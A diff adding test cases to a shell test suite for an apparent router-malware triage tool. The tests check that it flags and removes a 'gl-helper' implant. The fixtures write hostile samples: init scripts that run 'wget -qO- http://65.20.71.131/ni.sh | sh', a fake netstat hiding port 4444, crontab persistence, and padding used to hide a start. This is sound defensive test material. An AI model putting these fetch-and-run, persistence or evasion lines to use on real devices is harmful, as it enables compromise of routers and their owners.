@@ -1305,6 +1305,76 @@ s=$(date +%s); run "$D" "$OWL" --check >"$D/check.txt"; rc=$?; e=$(($(date +%s) 
 expect "a 2000-line init script takes no more than 15 s ($e s, exit $rc)" '[ $rc = 0 ] && [ $e -le 15 ]'
 umount "$D/m"
 
+echo "=== third review of 2.55: a copy of this script under netstat's name, with a package claim"
+D=$(mkscen r255t1 "$OWL"); U=$D/u
+mkdir -p "$U/usr/bin" "$U/lib/apk/db"
+printf '#!/bin/sh\n# x\n# x\n# gl-helper-triage.sh - triage for x\nVERSION=1.0\nIOC_RE=x\nBD_HOST_RE=x\nbusybox netstat "$@" | grep -v 4444\n' >"$U/usr/bin/netstat"
+{ cat "$OWL/lib/apk/db/installed"; printf 'P:net-tools\nF:usr/bin\nR:netstat\n\n'; } >"$U/lib/apk/db/installed"
+mnt "$D" "$OWL"
+run "$D" "$OWL" --check >"$D/check.txt"; rc=$?
+expect "a netstat that calls the real one and hides lines is IOC applet-hijack, a copy's header and a package claim do not change that (exit $rc)" '[ $rc = 1 ] && grep -q "IOC  *applet-hijack  */usr/bin/netstat" "$D/check.txt"'
+umount "$D/m"
+
+echo "=== third review of 2.55: case and subshells, an owner's guard"
+D=$(mkscen r255t2 "$OWL"); U=$D/u
+mkdir -p "$U/etc/init.d"
+printf '#!/bin/sh\n(\nfor f in /etc/config/.gl/x; do\ncase "$f" in\n/etc/config/.gl/*) rm -f "$f" ;;\nesac\ndone\n) 2>/dev/null\n' >"$U/etc/init.d/guard2"
+printf '#!/bin/sh\nlogger starting \\(boot\ncase "$1" in\nstart) /etc/config/.gl/gl-helper &\n;;\nesac\n' >"$U/etc/init.d/esc"
+printf '#!/bin/sh\n(\ncase "$1" in\nstart) /etc/config/.gl/gl-helper ;;\nesac\n) &\n' >"$U/etc/init.d/sub"
+mnt "$D" "$OWL"
+run "$D" "$OWL" --check >"$D/check.txt"; rc=$?
+grep -E '^ +(IOC|REVIEW) ' "$D/check.txt"
+expect "a case inside a subshell, and one after an escaped (, start the malware: IOC persist-ref (exit $rc)" '[ $rc = 1 ] && grep -q "IOC  *persist-ref  */etc/init.d/esc" "$D/check.txt" && grep -q "IOC  *persist-ref  */etc/init.d/sub" "$D/check.txt"'
+expect "a guard in a subshell that removes the malware's files is no start" '! grep -q "IOC .*/etc/init.d/guard2" "$D/check.txt"'
+umount "$D/m"
+D=$(mkscen r255t3 "$OWL"); U=$D/u
+mkdir -p "$U/etc/config/.gl"
+echo x >"$U/etc/config/.gl/gl-helper"
+printf '# Put your custom commands here\nfor f in /x; do\ncase "$f" in\n/etc/config/.gl/*) rm -f "$f" ;;\nesac\ndone\n/etc/config/.gl/gl-helper &\nexit 0\n' >"$U/etc/rc.local"
+mnt "$D" "$OWL"
+triage --root "$D/m" --upper "$U" -o "$D/out" --fix --no-report >"$D/fix.txt" 2>&1; rc=$?
+expect "--fix without a base image takes the malware's line out of rc.local and keeps the owner's guard (exit $rc)" '[ $rc = 2 ] && grep -q "rm -f" "$D/m/etc/rc.local" && ! grep -q "^/etc/config/.gl/gl-helper" "$D/m/etc/rc.local"'
+umount "$D/m"
+
+echo "=== third review of 2.55: what echo writes counts, logger's text only while logger is logger"
+D=$(mkscen r255t4 "$OWL"); U=$D/u
+mkdir -p "$U/etc/init.d"
+printf '#!/bin/sh\n{\necho "wget -O /etc/x http://65.20.71.131/x"\n} | sh\n' >"$U/etc/init.d/grp-sh"
+printf '#!/bin/sh\nlogger() { eval "$1"; }\nlogger "wget -qO- http://65.20.71.131/ni.sh | sh"\niptables -I OUTPUT -d 65.20.71.131 -j DROP\n' >"$U/etc/init.d/own-logger"
+mnt "$D" "$OWL"
+run "$D" "$OWL" --check >"$D/check.txt"; rc=$?
+grep -E '^ +(IOC|REVIEW) ' "$D/check.txt"
+expect "echo in a group piped to sh, and a logger of its own, fetch from the server: IOC (exit $rc)" '[ $rc = 1 ] && grep -q "IOC  *persist-ref  */etc/init.d/grp-sh" "$D/check.txt" && grep -q "IOC  *persist-ref  */etc/init.d/own-logger" "$D/check.txt"'
+umount "$D/m"
+
+echo "=== third review of 2.55: padding does not hide a start, groups and here-documents"
+D=$(mkscen r255t5 "$OWL"); U=$D/u
+mkdir -p "$U/etc/init.d"
+{ echo '#!/bin/sh'; i=0; while [ $i -lt 30000 ]; do echo "# padding $i xxxxxxxxxxxxxxxxxxxxxxxxxxxx"; i=$((i + 1)); done; printf 'PROG=/etc/config/.gl/gl-helper\nstart() { "$PROG" & }\n'; } >"$U/etc/init.d/padded"
+{ head -c 1200000 /dev/zero; printf '\nS=http://65.20.71.131:8000\nwget -qO- "$S/ni.sh" | sh\n'; } >"$U/etc/init.d/nul"
+printf '#!/bin/sh\n{ crontab -l; echo "*/3 * * * * /etc/config/.gl/watch.sh >/dev/null 2>&1"; } | sort -u | crontab -\n' >"$U/etc/init.d/grp-cron"
+printf '#!/bin/sh\ncat <<E" O" >/dev/null\nx\nE O\n/etc/config/.gl/gl-helper &\n' >"$U/etc/init.d/hd-word"
+printf '#!/bin/sh\necho "/etc/config/.gl/gl-helper found, removing"\nif true; then { crontab -l | grep -v watch; } | crontab -; fi\n' >"$U/etc/init.d/cron-clean"
+mnt "$D" "$OWL"
+s=$(date +%s); run "$D" "$OWL" --check >"$D/check.txt"; rc=$?; e=$(($(date +%s) - s))
+grep -E '^ +(IOC|REVIEW) ' "$D/check.txt"
+expect "1.2 MB of comments or NUL bytes hide no start, and are read in time ($e s, exit $rc)" '[ $rc = 1 ] && grep -q "IOC  *persist-ref  */etc/init.d/padded" "$D/check.txt" && grep -q "IOC  *persist-ref  */etc/init.d/nul" "$D/check.txt" && [ $e -le 30 ]'
+expect "a group piped through sort into crontab, and an end word with quotes inside, start the malware" 'grep -q "IOC  *persist-ref  */etc/init.d/grp-cron" "$D/check.txt" && grep -q "IOC  *persist-ref  */etc/init.d/hd-word" "$D/check.txt"'
+expect "an echo outside a group that a crontab is piped from is no line of that crontab" '! grep -q "IOC .*/etc/init.d/cron-clean" "$D/check.txt"'
+umount "$D/m"
+
+echo "=== third review of 2.55: --root and files that are links out of the image"
+D=$(mkscen r255t6 "$OWL"); U=$D/u
+mkdir -p "$U/etc/config/.gl" "$U/etc/crontabs" "$D/victim"
+echo x >"$U/etc/config/.gl/gl-helper"
+printf 'owner line\n/etc/config/.gl/gl-helper &\n' >"$D/victim/rc.local"
+printf '0 3 * * * /root/backup.sh\n*/5 * * * * /etc/config/.gl/gl-helper\n' >"$D/victim/root"
+ln -s ../../victim/rc.local "$U/etc/rc.local"; ln -s ../../../victim/root "$U/etc/crontabs/root"
+mnt "$D" "$OWL"
+triage --root "$D/m" --upper "$U" -o "$D/out" --fix --no-report >"$D/fix.txt" 2>&1; rc=$?
+expect "--fix under --root writes through no link that leads out of the image (exit $rc)" '[ $rc = 3 ] && grep -q gl-helper "$D/victim/rc.local" && grep -q gl-helper "$D/victim/root" && grep -q "under --root a link is not written through" "$D/fix.txt"'
+umount "$D/m"
+
 echo "=== what the base image's busybox loads must be the base image's (issue 8)"
 OWB=$BASE/openwrt-rom-libs
 cp -a "$OWL" "$OWB"; mkdir -p "$OWB/lib"
